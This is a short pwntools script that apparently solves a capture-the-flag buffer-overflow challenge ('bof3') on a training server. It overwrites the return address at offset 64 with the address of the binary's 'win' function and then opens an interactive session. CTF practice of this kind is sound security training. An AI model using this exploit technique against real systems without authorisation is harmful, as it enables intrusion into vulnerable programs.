from pwn import *
# connect to problem
io = remote("ctf.hackucf.org", 9002)

exe = context.binary = ELF('bof3')

#io = exe.process()
#load address of function win
winaddr = exe.symbols['win']
#pack at offset 64
payload = fit({
    64: winaddr
})
#send payload
io.sendline(payload)

io.interactive()
